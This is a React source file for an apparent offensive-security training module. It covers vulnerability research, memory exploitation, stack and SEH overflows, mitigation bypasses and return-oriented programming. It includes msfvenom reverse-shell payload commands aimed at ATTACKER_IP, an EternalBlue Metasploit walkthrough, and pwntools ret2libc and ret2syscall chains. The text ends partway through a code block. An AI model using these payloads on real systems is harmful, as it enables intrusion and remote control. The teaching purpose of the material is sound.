'use client'
import React from 'react'
import Link from 'next/link'
import ModuleCodex, { CodexChapter } from '../../components/ModuleCodex'

const mono = 'JetBrains Mono, monospace'
const accent = '#bf5fff'

const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: mono, fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#050805', border: '1px solid #1a002e', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: mono, fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)
const H3 = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{ fontFamily: mono, fontSize: '0.85rem', fontWeight: 600, color: '#9933cc', marginTop: '2rem', marginBottom: '0.75rem' }}>&#9658; {children}</h3>
)
const P = ({ children }: { children: React.ReactNode }) => (
  <p style={{ color: '#8a9a8a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.9rem' }}>{children}</p>
)
const Note = ({ type = 'info', children }: { type?: string; children: React.ReactNode }) => {
  const map: Record<string, [string, string, string]> = {
    info:     [accent,     'rgba(191,95,255,0.05)',  'NOTE'],
    warn:     ['#ffb347',  'rgba(255,179,71,0.05)',  'WARNING'],
    danger:   ['#ff4136',  'rgba(255,65,54,0.06)',   'CRITICAL'],
    tip:      ['#00ff41',  'rgba(0,255,65,0.04)',    'PRO TIP'],
    beginner: ['#00d4ff',  'rgba(0,212,255,0.05)',   'BEGINNER NOTE'],
  }
  const [c, bg, lbl] = map[type] ?? map.info
  return (
    <div style={{ background: bg, borderLeft: '3px solid ' + c, padding: '1rem 1.25rem', borderRadius: '0 4px 4px 0', margin: '1.5rem 0', border: '1px solid ' + c + '33', borderLeftColor: c }}>
      <div style={{ fontFamily: mono, fontSize: '9px', color: c, letterSpacing: '0.2em', marginBottom: '6px' }}>{lbl}</div>
      <div style={{ color: '#8a9a8a', fontSize: '0.85rem', lineHeight: 1.7 }}>{children}</div>
    </div>
  )
}
const Table = ({ headers, rows }: { headers: string[]; rows: string[][] }) => (
  <div style={{ overflowX: 'auto', margin: '1rem 0 1.5rem' }}>
    <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: mono, fontSize: '0.75rem' }}>
      <thead>
        <tr style={{ borderBottom: '1px solid #1a002e' }}>
          {headers.map((h, i) => <th key={i} style={{ textAlign: 'left', padding: '8px 12px', color: '#9933cc', fontWeight: 600, letterSpacing: '0.1em', fontSize: '0.7rem' }}>{h}</th>)}
        </tr>
      </thead>
      <tbody>
        {rows.map((row, i) => (
          <tr key={i} style={{ borderBottom: '1px solid #0e001a', background: i % 2 === 0 ? 'transparent' : 'rgba(191,95,255,0.02)' }}>
            {row.map((cell, j) => <td key={j} style={{ padding: '8px 12px', color: '#8a9a8a', verticalAlign: 'top' }}>{cell}</td>)}
          </tr>
        ))}
      </tbody>
    </table>
  </div>
)

const chapters: CodexChapter[] = [
  {
    id: 'vuln-research',
    title: 'Vulnerability Research Methodology',
    difficulty: 'BEGINNER',
    readTime: '18 min',
    labLink: '/modules/offensive/lab',
    takeaways: [
      'CVSS v3.1 scores vulnerabilities 0-10 across Base, Temporal, and Environmental metric groups.',
      'CVE identifies specific vulnerabilities; CWE classifies the underlying weakness type.',
      'Responsible disclosure gives vendors time to patch before public details are released.',
      'Bug bounty platforms (HackerOne, Bugcrowd, Intigriti) let researchers earn rewards legally.',
      'Patch diffing reveals exactly what a vendor fixed, which often points directly to the vulnerability.'
    ],
    content: (
      <div>
        <Note type="beginner">Vulnerability research is the systematic process of finding security flaws before attackers do - or understanding flaws after they are discovered. Every exploit starts with a vulnerability, so understanding how they are classified and tracked is essential context for everything else in this module.</Note>
        <P>The security industry uses standardised systems to track, score, and communicate vulnerabilities. These systems let defenders prioritise what to patch first and let researchers publish findings in a structured way.</P>

        <H3>CVE and CWE - The Classification Systems</H3>
        <P>A CVE (Common Vulnerabilities and Exposures) is a specific instance of a vulnerability in a specific product. A CWE (Common Weakness Enumeration) is the category of weakness that caused it. The distinction matters: CWE-79 is "Cross-site Scripting" (the weakness type); CVE-2021-44228 is Log4Shell (the specific instance in Log4j).</P>
        <Table
          headers={['TERM', 'WHAT IT IS', 'EXAMPLE']}
          rows={[
            ['CVE', 'Unique ID for a specific vulnerability in a specific product', 'CVE-2021-44228 (Log4Shell in Log4j)'],
            ['CWE', 'Category of weakness that leads to vulnerabilities', 'CWE-79 XSS, CWE-89 SQLi, CWE-119 Buffer Overflow'],
            ['NVD', 'NIST National Vulnerability Database - enriches CVEs with CVSS scores', 'nvd.nist.gov'],
            ['MITRE', 'Maintains the CVE list and CWE list', 'cve.mitre.org, cwe.mitre.org'],
            ['Exploit-DB', 'Public exploit archive, searchable by CVE or product', 'exploit-db.com'],
            ['Rapid7 VulnDB', 'Commercial vuln database with deep technical detail', 'vulndb.rapid7.com'],
          ]}
        />

        <H3>CVSS Scoring - How Severity is Measured</H3>
        <P>CVSS (Common Vulnerability Scoring System) produces a 0.0-10.0 score. Version 3.1 is current; version 4.0 was released in 2023. The score has three metric groups:</P>
        <Table
          headers={['GROUP', 'METRICS', 'WHAT IT MEASURES']}
          rows={[
            ['Base', 'Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, Confidentiality/Integrity/Availability Impact', 'Intrinsic severity of the flaw itself, unchanged by time or environment'],
            ['Temporal', 'Exploit Code Maturity, Remediation Level, Report Confidence', 'How the severity changes over time (PoC available? Patch released?)'],
            ['Environmental', 'Modified Base metrics + Confidentiality/Integrity/Availability Requirements', 'Severity adjusted for YOUR specific environment and asset criticality'],
          ]}
        />
        <Table
          headers={['CVSS RANGE', 'SEVERITY', 'TYPICAL MEANING']}
          rows={[
            ['0.1 - 3.9', 'LOW', 'Difficult to exploit, minimal impact'],
            ['4.0 - 6.9', 'MEDIUM', 'Some exploitation difficulty or limited impact'],
            ['7.0 - 8.9', 'HIGH', 'Relatively easy to exploit with significant impact'],
            ['9.0 - 10.0', 'CRITICAL', 'Network-exploitable, no auth, full system compromise possible'],
          ]}
        />
        <Note type="warn">CVSS scores describe severity, not risk. A CVSS 10.0 on an internet-isolated system may be less urgent than a CVSS 7.0 on your public web server. Always apply environmental context.</Note>

        <H3>Vulnerability Lifecycle</H3>
        <P>Understanding where a vulnerability sits in its lifecycle determines how urgent patching is and what exploit options exist:</P>
        <Pre label="VULNERABILITY LIFECYCLE">{`DISCOVERY       Researcher or attacker finds the flaw
     |
     v
PROOF OF CONCEPT  Minimal code confirming exploitability (PoC)
     |
     v
WEAPONISATION   PoC refined into reliable exploit (may include evasion)
     |
     v
PATCH RELEASE   Vendor releases fix
     |
     v
N-DAY WINDOW    Vulnerable systems still unpatched - race against time
     |
     v
PATCH COMPLETE  Exposure minimised (never zero - some never patch)`}</Pre>

        <H3>Zero-Day vs N-Day</H3>
        <P>A zero-day (0-day) is a vulnerability that has no available patch - "zero days" for defenders to patch before attackers exploit it. An N-day is a vulnerability with a patch available for N days. N-days are often more dangerous in practice because they are well-documented and widely weaponised, but many organisations patch slowly.</P>

        <H3>Disclosure Models</H3>
        <Table
          headers={['MODEL', 'APPROACH', 'PROS', 'CONS']}
          rows={[
            ['Responsible/Coordinated', 'Researcher notifies vendor privately, gives fix deadline (typically 90 days per Google Project Zero), then publishes', 'Gives vendors time to patch; industry standard', 'Vendors may drag feet; stressful for researcher'],
            ['Full Disclosure', 'Researcher publishes all details immediately with no vendor notification', 'Forces vendors to act; helps defenders too', 'Gives attackers immediate weaponisable details'],
            ['Bug Bounty (HackerOne, Bugcrowd, Intigriti)', 'Researcher submits via platform, receives monetary reward per programme scope', 'Legal, paid, structured, often includes coordinated disclosure', 'Programme scope limits what you can test; triage delays'],
          ]}
        />

        <H3>Patch Diffing</H3>
        <P>When a vendor releases a security patch, the difference between the patched and unpatched binary reveals exactly what was fixed. Tools like BinDiff (Zynamics/Google) and Diaphora (open source) perform binary diffing to identify changed functions. Researchers use this to reconstruct the vulnerability from the patch - often faster than independent discovery.</P>
        <Pre label="PATCH DIFFING WORKFLOW">{`1. Download vulnerable version binary
2. Apply vendor patch to get patched binary
3. Load both into BinDiff/Diaphora
4. Identify changed functions (highlighted by diff tool)
5. Analyse changed function in Ghidra/IDA to understand the fix
6. Work backwards to understand the exploitable path in the old version`}</Pre>
      </div>
    ),
  },

  {
    id: 'exploitation-fundamentals',
    title: 'Exploitation Fundamentals',
    difficulty: 'BEGINNER',
    readTime: '20 min',
    labLink: '/modules/offensive/lab',
    takeaways: [
      'Memory is divided into segments: stack (local vars/return addresses), heap (dynamic alloc), BSS/data (globals), text (executable code).',
      'The instruction pointer (EIP/RIP) controls what code executes next - overwriting it is the goal of most memory corruption exploits.',
      'Shellcode is position-independent machine code injected and executed as part of an exploit payload.',
      'Metasploit separates exploit modules (gain access) from auxiliary modules (scan/enumerate) and post modules (post-exploitation).',
      'Staged payloads (windows/meterpreter/reverse_tcp) send a small stager first; stageless payloads contain the full payload in one.'
    ],
    content: (
      <div>
        <Note type="beginner">This chapter covers the conceptual foundation of memory exploitation. You do not need to write assembly to understand these concepts - focus on understanding what each component does and why it matters before moving to the hands-on chapters.</Note>

        <H3>Memory Layout of a Process</H3>
        <P>When a program runs, the OS allocates virtual memory divided into segments. Understanding this layout is essential for exploitation:</P>
        <Table
          headers={['SEGMENT', 'CONTENTS', 'GROWS', 'EXPLOITABLE WHEN']}
          rows={[
            ['.text', 'Executable code (read + execute, not writable)', '-', 'ROP gadgets are sourced from here'],
            ['.data', 'Initialised global/static variables', '-', 'Overwriting function pointers stored here'],
            ['.bss', 'Uninitialised global/static variables (zeroed at start)', '-', 'Similar to .data exploitation'],
            ['heap', 'Dynamic allocations (malloc/new)', 'Upward (low to high address)', 'Use-after-free, heap overflows, double free'],
            ['stack', 'Local variables, function arguments, saved EBP, return address', 'Downward (high to low address)', 'Buffer overflow to overwrite return address'],
          ]}
        />

        <H3>x86 and x64 Registers</H3>
        <Pre label="KEY REGISTERS">{`x86 (32-bit):
  EAX  Accumulator (return values, arithmetic)
  EBX  Base register (general purpose)
  ECX  Counter (loop counter, string ops)
  EDX  Data register (I/O, arithmetic)
  ESI  Source Index (string source pointer)
  EDI  Destination Index (string destination pointer)
  EBP  Base Pointer (stack frame base - saved by callee)
  ESP  Stack Pointer (top of stack - points to last pushed value)
  EIP  Instruction Pointer (address of NEXT instruction to execute)

x64 (64-bit) adds/extends:
  RAX-RDX (64-bit versions of EAX-EDX)
  RSI, RDI, RBP, RSP, RIP (64-bit versions)
  R8-R15 (8 additional general purpose registers)`}</Pre>
        <Note type="info">EIP/RIP is the crown jewel. If an attacker controls the instruction pointer, they control what code executes next. Every stack overflow attack aims to overwrite the saved return address, which gets loaded into EIP/RIP when the function returns.</Note>

        <H3>Calling Conventions</H3>
        <P>Calling conventions define how functions pass arguments and who cleans up the stack. This matters when writing exploits that call functions:</P>
        <Table
          headers={['CONVENTION', 'ARG PASSING', 'STACK CLEANUP', 'USED BY']}
          rows={[
            ['cdecl', 'Stack (right to left)', 'Caller', 'Most C code on Linux x86'],
            ['stdcall', 'Stack (right to left)', 'Callee', 'Windows API (WinAPI functions)'],
            ['fastcall', 'First 2 args in ECX/EDX, rest on stack', 'Callee', 'Windows compiler optimisations'],
            ['x64 System V ABI', 'First 6 args in RDI,RSI,RDX,RCX,R8,R9 then stack', 'Caller', 'Linux/macOS 64-bit'],
            ['x64 Windows ABI', 'First 4 args in RCX,RDX,R8,R9 then stack', 'Caller', 'Windows 64-bit'],
          ]}
        />

        <H3>Shellcode and NOP Sleds</H3>
        <P>Shellcode is position-independent machine code (PIC) designed to be injected into a vulnerable process and executed. Traditionally it spawned a shell, but modern shellcode can do anything: bind a port, download a second stage, add a user. It must be position-independent because it will execute from an address the attacker cannot know at compile time.</P>
        <P>A NOP sled (no-operation sled) is a sequence of 0x90 (NOP) instructions placed before the shellcode payload. Because a NOP does nothing and execution slides down to the next instruction, a NOP sled gives the attacker a larger landing zone when the exact shellcode address is uncertain.</P>
        <Pre label="CLASSIC PAYLOAD STRUCTURE (32-bit stack overflow)">{`[JUNK PADDING - fills buffer up to saved EBP]
[SAVED EBP OVERWRITE - 4 bytes, often BBBB / 0x42424242]
[RETURN ADDRESS - points to JMP ESP gadget in non-ASLR DLL]
[NOP SLED - 16-64 bytes of 0x90]
[SHELLCODE - position-independent machine code]`}</Pre>

        <H3>Metasploit Framework</H3>
        <P>Metasploit is the industry standard open-source exploitation framework. Core concepts:</P>
        <Table
          headers={['COMPONENT', 'PURPOSE']}
          rows={[
            ['exploit module', 'Exploits a specific vulnerability to gain code execution'],
            ['payload', 'Code that runs after exploitation (shell, meterpreter, etc.)'],
            ['auxiliary module', 'Scanning, enumeration, fuzzing without exploitation'],
            ['post module', 'Post-exploitation: privilege escalation, pivoting, data collection'],
            ['encoder', 'Obfuscates payload to evade signature detection'],
            ['msfdb', 'PostgreSQL database storing hosts, services, credentials, loot'],
          ]}
        />
        <Pre label="CORE METASPLOIT WORKFLOW">{`msfconsole                          # Start Metasploit
msf> search ms17-010                # Find modules by name/CVE
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> show options                   # View required/optional settings
msf> set RHOSTS 192.168.1.50
msf> set LHOST 192.168.1.100        # Your listener IP
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf> run                            # Launch exploit
msf> sessions -l                    # List active sessions
msf> sessions -i 1                  # Interact with session 1`}</Pre>

        <H3>msfvenom - Standalone Payload Generation</H3>
        <Pre label="MSFVENOM EXAMPLES">{`# Stageless Windows reverse shell EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o payload.exe

# Staged Meterpreter Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o met.elf

# Encoded payload (avoid bad chars, encode 10 times)
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -i 10 -b "\\x00\\x0a\\x0d" -f raw -o payload.bin

# KEY FLAGS:
# -p  payload name
# -f  output format (exe, elf, raw, python, c, dll...)
# -e  encoder
# -i  encoding iterations
# -b  bad characters to avoid in payload`}</Pre>
        <Note type="tip">Staged payloads (forward slash in name: windows/meterpreter/reverse_tcp) send a small stager that downloads the full payload. Stageless payloads (double underscore: windows/meterpreter_reverse_tcp) embed everything - larger but work when outbound HTTP is blocked.</Note>
      </div>
    ),
  },

  {
    id: 'stack-bof',
    title: 'Stack Buffer Overflows',
    difficulty: 'INTERMEDIATE',
    readTime: '25 min',
    labLink: '/modules/offensive/lab',
    takeaways: [
      'Finding the overflow offset with cyclic patterns (msf-pattern_create/pattern_offset) is the first step after confirming a crash.',
      'Bad character testing must be methodical - send all bytes 0x01-0xFF and inspect memory to find which are corrupted.',
      'JMP ESP in a non-ASLR DLL is the classic return address target on 32-bit Windows - use mona.py to find it.',
      'SEH overflows target the exception handler chain rather than the return address, requiring POP POP RET gadgets.',
      'mona.py (!mona findmsp, !mona jmp, !mona seh) automates the tedious parts of manual overflow development.'
    ],
    content: (
      <div>
        <Note type="beginner">Stack buffer overflows are the foundational memory corruption exploit. Modern systems have many mitigations (covered in Chapter 4), but understanding the classic technique is essential before understanding bypasses. Many embedded systems, legacy software, and CTF challenges still lack these protections.</Note>

        <H3>How Stack Overflows Work</H3>
        <P>When a function declares a local buffer and writes more data into it than the buffer can hold, the excess bytes overwrite adjacent stack memory. If the overflow is large enough, it reaches the saved return address. When the function returns and loads the saved return address into EIP, the attacker controls where execution jumps.</P>
        <Pre label="STACK FRAME LAYOUT (32-bit, growing downward)">{`HIGH ADDRESS
  [function arguments]
  [saved return address]   <-- overwrite this to control EIP
  [saved EBP]
  [local buffer - 100 bytes]
  [more local variables]
LOW ADDRESS (ESP points here)

Overflow: write 104+ bytes into the 100-byte buffer
  bytes 1-100:   fill the buffer
  bytes 101-104: overwrite saved EBP
  bytes 105-108: overwrite saved return address -> control EIP`}</Pre>

        <H3>Finding the Offset - Cyclic Patterns</H3>
        <P>Rather than guessing how many bytes reach EIP, use a cyclic pattern where every 4-byte subsequence is unique. When the program crashes with the pattern in EIP, you can calculate the exact offset.</P>
        <Pre label="FINDING OFFSET WITH METASPLOIT PATTERN TOOLS">{`# Generate 3000-byte cyclic pattern
msf-pattern_create -l 3000
/usr/bin/msf-pattern_create -l 3000

# After crash, note EIP value (e.g. 0x6F43396E)
msf-pattern_offset -l 3000 -q 6F43396E
# Output: [*] Exact match at offset 2003

# Alternative: pwntools cyclic
python3 -c "from pwn import *; print(cyclic(3000))"
python3 -c "from pwn import *; print(cyclic_find(0x6f43396e))"

# Verify: send 2003 x 'A' + 4 x 'B' + rest 'C'
# EIP should be 0x42424242 (BBBB)`}</Pre>

        <H3>Finding Bad Characters</H3>
        <P>Some bytes corrupt the payload when processed by the vulnerable application. Common bad chars: 0x00 (null terminator - truncates strings), 0x0a (newline), 0x0d (carriage return), 0xff (sometimes). You must find all bad chars for your specific target.</P>
        <Pre label="BAD CHARACTER TEST METHODOLOGY">{`# Generate test string: all bytes 0x01 to 0xFF
badchars = (
  "\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10"
  "\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20"
  # ... continue through 0xFF
)
# Send: PADDING (offset bytes) + BBBB (EIP) + badchars
# In Immunity: follow ESP in dump, look for sequence break
# Missing/changed byte = bad character -> remove and re-test`}</Pre>

        <H3>Finding the Return Address - JMP ESP</H3>
        <P>Rather than hardcoding a stack address (which changes between runs), find a JMP ESP instruction in a loaded DLL that does not use ASLR. When the function returns, ESP points to your shellcode. JMP ESP redirects execution there reliably.</P>
        <Pre label="MONA.PY IN IMMUNITY DEBUGGER">{`# Install mona.py into Immunity Debugger PyCommands folder
# Then in Immunity command bar:

!mona pattern_create 3000          # Generate cyclic pattern
!mona findmsp                      # After crash - find offset automatically

!mona jmp -r esp                   # Find JMP ESP in all loaded modules
!mona jmp -r esp -cpb "\\x00\\x0a"  # Exclude modules with bad chars in address

# Result: address like 0x625011af (in essfunc.dll, no ASLR, no SafeSEH)
# Use this address as return address (little-endian): \\xaf\\x11\\x50\\x62`}</Pre>

        <H3>SEH (Structured Exception Handler) Overflows</H3>
        <P>Some applications use SEH-based overflows where the exception handler chain is overwritten rather than the return address. Windows SEH uses a linked list of exception records on the stack. Each record has two pointers: nSEH (next SEH record) and SEH handler (function pointer called on exception).</P>
        <Pre label="SEH OVERFLOW STRUCTURE">{`PAYLOAD STRUCTURE for SEH overflow:
  [PADDING to reach SEH record]
  [nSEH - 4 bytes: short jump over SEH handler - \\xeb\\x06\\x90\\x90]
  [SEH handler - 4 bytes: address of POP POP RET gadget]
  [NOP sled]
  [SHELLCODE]

WHY POP POP RET:
  When exception fires, ESP points into our payload
  POP removes exception pointers from stack
  RET jumps to nSEH which is our short jump
  Short jump lands in NOP sled -> shellcode

FINDING POP POP RET WITH MONA:
  !mona seh -cpb "\\x00\\x0a"
  # Finds POP r32 / POP r32 / RET in non-SafeSEH modules`}</Pre>

        <H3>GDB with PEDA/pwndbg for Linux</H3>
        <Pre label="LINUX OVERFLOW WORKFLOW">{`# Install pwndbg: git clone https://github.com/pwndbg/pwndbg && ./setup.sh
gdb ./vulnerable_binary
(gdb) run $(python3 -c "from pwn import *; print(cyclic(500))")
# Program crashes with SIGSEGV
(gdb) info registers eip        # or rip for 64-bit
(gdb) x/40x $esp                # Examine stack
# pwndbg: 'cyclic -l VALUE' to find offset directly

# After finding offset:
(gdb) run $(python3 -c "print('A'*offset + 'BBBB' + 'C'*100)")`}</Pre>
      </div>
    ),
  },

  {
    id: 'mitigations',
    title: 'Modern Exploit Mitigations and Bypasses',
    difficulty: 'ADVANCED',
    readTime: '22 min',
    labLink: '/modules/offensive/lab',
    takeaways: [
      'DEP/NX prevents executing data as code - bypassed with ROP chains that only use existing executable code.',
      'ASLR randomises memory layout - bypassed via information leak primitives or targeting non-ASLR modules.',
      'Stack canaries detect overflow before return - bypassed via format string leaks or brute force on forking servers.',
      'PIE randomises the executable base - requires an additional leak to defeat on top of ASLR bypass.',
      'Combining multiple mitigations (ASLR + PIE + Full RELRO + canary) requires chaining multiple bypass techniques.'
    ],
    content: (
      <div>
        <Note type="warn">Modern systems deploy multiple mitigations simultaneously. A real exploit must bypass all active protections. Understanding each mitigation individually is the prerequisite to chaining bypasses.</Note>

        <H3>DEP / NX (Data Execution Prevention / No-Execute)</H3>
        <P>DEP marks memory pages as either executable OR writable, never both. Stack and heap are writable but not executable. Code is executable but not writable. This prevents injecting shellcode into the stack and jumping to it.</P>
        <P>Hardware enforcement: Intel XD bit, AMD NX bit in the page table entry. Windows DEP is enabled for all processes in "OptIn" mode and system processes always. Linux NX via kernel and ELF PT_GNU_STACK header.</P>
        <P>Bypass: Return-Oriented Programming (ROP) - use existing executable code fragments (gadgets). Covered in depth in Chapter 5.</P>

        <H3>ASLR (Address Space Layout Randomisation)</H3>
        <P>ASLR randomises the base addresses of the stack, heap, and shared libraries at each process start. An attacker cannot hardcode a return address because the target moves between runs.</P>
        <Table
          headers={['ASLR TYPE', 'WHAT IS RANDOMISED', 'BYPASS']}
          rows={[
            ['No ASLR (old Windows, embedded)', 'Nothing', 'Direct hardcoded addresses work'],
            ['Partial ASLR', 'Shared libs randomised; executable at fixed base (no PIE)', 'Use gadgets from the non-randomised executable'],
            ['Full ASLR + PIE', 'Everything randomised', 'Need info leak to defeat; heap spray as probabilistic bypass'],
          ]}
        />
        <P>Bypass techniques: (1) Information leak - a separate read vulnerability exposes a pointer, revealing the randomised base. (2) Non-ASLR module - a loaded DLL compiled without ASLR provides fixed gadget addresses. (3) Heap spray - fill heap with shellcode and NOP sleds to increase probability of hitting valid shellcode.</P>

        <H3>Stack Canaries</H3>
        <P>The compiler inserts a random value (canary) between local variables and the saved return address. Before returning, the function checks whether the canary is intact. If overwritten, execution aborts with stack smashing detected.</P>
        <Table
          headers={['CANARY TYPE', 'VALUE', 'NOTES']}
          rows={[
            ['Terminator', 'Contains null bytes (0x00000a00 etc.)', 'Null terminates string-based overflows - easy to detect'],
            ['Random', 'Full random value from /dev/urandom at startup', 'Requires leak to bypass'],
            ['Random XOR', 'Random XOR with frame pointer', 'Used in x64 Linux glibc SSP'],
          ]}
        />
        <P>Bypass: (1) Format string vulnerability to leak the canary value from memory. (2) Brute force on forking servers - fork() copies parent canary to child; wrong guess kills child but parent keeps the same canary; try all 256 values for each byte systematically (takes 1024 attempts for 4-byte canary on 32-bit).</P>

        <H3>PIE (Position Independent Executable)</H3>
        <P>PIE compiles the executable itself as position-independent code, allowing the OS to load it at a random base address. Without PIE, the executable binary is always at a fixed address even with ASLR - providing reliable gadget sources. With PIE + ASLR, everything is randomised.</P>
        <P>Bypass: PIE requires defeating ASLR first - need an info leak that reveals the executable base address, then calculate gadget offsets relative to that base.</P>

        <H3>Windows-Specific Protections</H3>
        <Table
          headers={['MITIGATION', 'MECHANISM', 'BYPASS']}
          rows={[
            ['SafeSEH', 'SEH handler must be registered at compile time; unregistered handlers blocked', 'Use SEH handler from non-SafeSEH DLL, or ROP'],
            ['SEHOP (Vista+)', 'Validates entire SEH chain before dispatching exception', 'Very hard to bypass; need heap spray or info leak'],
            ['CFG (Control Flow Guard)', 'Validates indirect calls/jumps against a bitmap of valid targets', 'Bypass via direct call sites not covered by CFG, or use CFG-exempt export functions'],
            ['CET (Hardware Shadow Stack)', 'Hardware maintains shadow return address stack; mismatches cause fault', 'Requires hypervisor or kernel-level bypass; very robust'],
          ]}
        />

        <H3>Linux-Specific Protections</H3>
        <Table
          headers={['MITIGATION', 'WHAT IT DOES', 'BYPASS']}
          rows={[
            ['Partial RELRO', 'Makes .init_array/.fini_array read-only after init; GOT still writable', 'Overwrite GOT entries for arbitrary code execution'],
            ['Full RELRO', 'Resolves all symbols at startup, then makes entire GOT read-only', 'GOT overwrite impossible; need other targets (hook functions)'],
            ['FORTIFY_SOURCE', 'Replaces unsafe libc calls with bounds-checking versions; abort on overflow', 'Use non-fortified functions, or stay within detected bounds'],
            ['Stack Smashing Protector (SSP/GS)', 'Stack canary (same as above)', 'Leak canary, brute force fork servers'],
          ]}
        />

        <H3>Format String Exploitation for Info Leaks</H3>
        <Pre label="FORMAT STRING LEAK TECHNIQUE">{`# If printf(user_input) is called (missing format argument):
# User input: %p %p %p %p %p %p %p %p
# This prints stack values as pointers - leaks canary, libc addresses

# Find canary offset on stack:
python3 -c "print('%p.' * 50)"   # Leak 50 stack words
# Identify canary by its pattern (ends in 0x00 on Linux)
# Exact offset: %7$p (print 7th argument directly)

# Once canary leaked, craft overflow with correct canary value
[PADDING] + [LEAKED_CANARY] + [SAVED_EBP] + [RET_ADDR]`}</Pre>
      </div>
    ),
  },

  {
    id: 'rop',
    title: 'Return-Oriented Programming',
    difficulty: 'ADVANCED',
    readTime: '28 min',
    labLink: '/modules/offensive/lab',
    takeaways: [
      'ROP bypasses DEP/NX by chaining existing executable code fragments (gadgets ending in RET) rather than injecting shellcode.',
      'ret2libc calls system("/bin/sh") by setting up the stack as if it were a normal function call to system().',
      'ret2syscall on Linux sets eax=59 (execve), rdi=binsh_addr, rsi=0, rdx=0, then executes syscall gadget.',
      'ROPgadget, ropper, and pwntools ROP class automate gadget discovery and chain construction.',
      'SROP abuses the sigreturn syscall to set all registers at once via a fake sigcontext structure on the stack.'
    ],
    content: (
      <div>
        <Note type="beginner">ROP is the primary technique for exploiting modern systems with DEP/NX enabled. Instead of injecting code, you reuse code that already exists in memory. Think of it like picking sentences out of a dictionary to make a new message - the words (gadgets) already exist, you just arrange them.</Note>

        <H3>ROP Concept</H3>
        <P>A gadget is a short sequence of instructions ending in a RET instruction. Because RET pops the top of stack into EIP/RIP, controlling the stack means controlling the sequence of gadgets executed. Each gadget does a small operation, and chaining many gadgets produces arbitrary computation - entirely from existing executable memory, bypassing DEP/NX.</P>
        <Pre label="ROP CHAIN EXECUTION MODEL">{`Stack (attacker controlled):
  [gadget1_addr]   <- ESP when function returns; RET loads this -> executes gadget1
  [gadget1_data]   <- data consumed by gadget1 (e.g. value to pop into register)
  [gadget2_addr]   <- after gadget1's RET; loads this -> executes gadget2
  [gadget2_data]
  [gadget3_addr]   <- e.g. syscall or call to system()
  ...

Common gadget types:
  pop rdi ; ret    <- Set RDI (first arg on x64 System V ABI)
  pop rsi ; ret    <- Set RSI (second arg)
  pop rdx ; ret    <- Set RDX (third arg)
  pop rax ; ret    <- Set RAX (syscall number)
  syscall          <- Execute Linux syscall
  int 0x80         <- Execute 32-bit Linux syscall
  mov [rax], rbx ; ret  <- Write RBX to memory at RAX`}</Pre>

        <H3>Finding Gadgets</H3>
        <Pre label="GADGET DISCOVERY TOOLS">{`# ROPgadget (pip install ROPGadget)
ROPgadget --binary ./vuln --rop
ROPgadget --binary ./vuln --string "/bin/sh"
ROPgadget --binary libc.so.6 --rop | grep "pop rdi"

# ropper
ropper --file ./vuln --search "pop rdi"
ropper --file libc.so.6 --search "pop rdi; ret"

# pwntools - built-in ROP class (see below)
# Gadget quality: prefer gadgets that only modify the register you intend
# Avoid gadgets with unwanted side effects (extra pops, memory writes)`}</Pre>

        <H3>ret2libc Attack</H3>
        <P>Call the system() function from libc with the argument "/bin/sh". On 32-bit: push arguments on stack before system() address. On 64-bit: use pop rdi gadget to set RDI to the /bin/sh string address, then call system().</P>
        <Pre label="RET2LIBC (x64 Linux)">{`# Step 1: Find system() address in libc
python3 -c "from pwn import *; l=ELF('/lib/x86_64-linux-gnu/libc.so.6'); print(hex(l.sym['system']))"

# Step 2: Find /bin/sh string in libc
python3 -c "from pwn import *; l=ELF('/lib/x86_64-linux-gnu/libc.so.6'); print(hex(next(l.search(b'/bin/sh'))))"

# Step 3: Find pop rdi; ret gadget
ROPgadget --binary vuln | grep "pop rdi"

# Step 4: Build chain (pwntools)
from pwn import *
elf = ELF('./vuln')
libc = ELF('./libc.so.6')
rop = ROP(elf)
# After leaking libc base (via puts leak of GOT entry):
libc.address = leaked_puts - libc.sym['puts']
rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
rop.raw(next(libc.search(b'/bin/sh')))
rop.raw(libc.sym['system'])
payload = b'A' * offset + bytes(rop)`}</Pre>

        <H3>ret2syscall (Linux execve)</H3>
        <Pre label="RET2SYSCALL (x64 Linux - execve /bin/sh)">{`# syscall number for execve on x64 Linux = 59 (0x3b)
# Arguments: rdi = ptr to "/bin/sh", rsi = 0, rdx = 0, rax = 59

from pwn import *
elf = ELF('./vuln')
rop = ROP(elf)

binsh = next(elf.search(b'/bin/sh'))   # or in libc

rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
rop.raw(binsh)
rop.raw(rop.find_gadget(['pop rsi', 'ret'])[0])
rop.raw(0)
rop.raw(rop.find_gadget(['pop rdx', 'ret'])[0])
rop.raw(0)
rop.raw(rop.find_gadget(['pop rax', 'ret'])[0])
rop.raw(59)             # execve syscall number
rop.raw(rop.find_gadget(['syscall'])[0])

payload = b'A' * offset + bytes(rop)`}</Pre>

        <H3>pwntools Complete ROP Reference</H3>
        <Pre label="PWNTOOLS ROP API">{`from pwn import *
elf = ELF('./binary')
rop = ROP(elf)

# Auto-chain: call function with args
rop.call('system', [next(elf.search(b'/bin/sh'))])

# Manual gadget placement
rop.raw(0xdeadbeef)                    # Raw address
rop.find_gadget(['pop rdi', 'ret'])    # Find specific gadget sequence

# Build flat payload
payload = flat(
    b'A' * 40,          # padding
